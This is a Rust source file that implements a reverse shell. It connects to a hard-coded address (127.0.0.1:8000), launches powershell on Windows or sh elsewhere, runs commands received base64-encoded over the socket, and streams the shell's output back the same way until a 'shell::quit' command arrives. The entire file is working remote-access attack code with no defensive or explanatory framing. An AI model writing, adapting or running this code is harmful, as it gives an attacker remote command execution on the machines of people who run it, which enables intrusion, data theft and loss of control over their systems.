use std::net::TcpStream;
use std::io::{BufReader, BufRead, Error, ErrorKind, Write};
use std::process::{Command, Stdio};
use std::env;
use std::thread;
extern crate base64;

fn get_data(stream: &TcpStream) -> std::io::Result<String> {
    let mut reader = BufReader::new(stream);
    let mut buf = String::new();
    reader.read_line(&mut buf)?;

    let b64_data: Vec<u8>;
    match base64::decode(&buf.trim()) {
        Ok(d) => b64_data = d,
        Err(e) => {
            return Err(Error::new(ErrorKind::InvalidData, format!("BASE64 {}", e)));
        }
    }

    Ok(String::from_utf8(b64_data).unwrap())
}

fn send_data(mut stream: &TcpStream, data: &[u8]) -> std::io::Result<()> {
    let mut encoded_data = base64::encode(data);
    encoded_data.push_str("\n");
    stream.write(encoded_data.as_bytes())?;
    Ok(())
}

fn read_pipe<T: std::io::Read>(pipe: T, stream: &TcpStream) {
    let mut reader = BufReader::new(pipe);

    loop {
        let mut buf = String::new();
        reader.read_line(&mut buf).unwrap();
        if !buf.is_empty() {
            send_data(&stream, buf.as_bytes()).unwrap();
        }   
    }
}

fn main() -> std::io::Result<()> {
    let stream = TcpStream::connect("127.0.0.1:8000")?;
    let os_shell: &str;
    if env::consts::OS == "windows" {
        os_shell = "powershell"
    } else {
        os_shell = "sh"
    }

    if let Ok(mut child) = Command::new(os_shell)
                                        .stdin(Stdio::piped())
                                        .stdout(Stdio::piped())
                                        .stderr(Stdio::piped())
                                        .spawn() {
        let mut stdin = child.stdin.take().unwrap();
        let stdout = child.stdout.take().unwrap();
        let stderr = child.stderr.take().unwrap();

        stdin.write(b"\n").unwrap();
        let stream_clone = stream.try_clone().unwrap();
        let stream_clone2 = stream.try_clone().unwrap();

        thread::spawn(move|| {read_pipe(stdout, &stream_clone)} );
        thread::spawn(move|| {read_pipe(stderr, &stream_clone2)} );

        loop {
            let input = get_data(&stream)?;
            
            if input.trim() == String::from("shell::quit") {
                break;
            }

            stdin.write(input.as_bytes()).unwrap();
            
            if input != String::from("\r\n") && input != String::from("\n") {
                stdin.write(b"\n").unwrap();
            }
        }            

        drop(stdin);
        child.wait().unwrap();
    }   
    Ok(())
}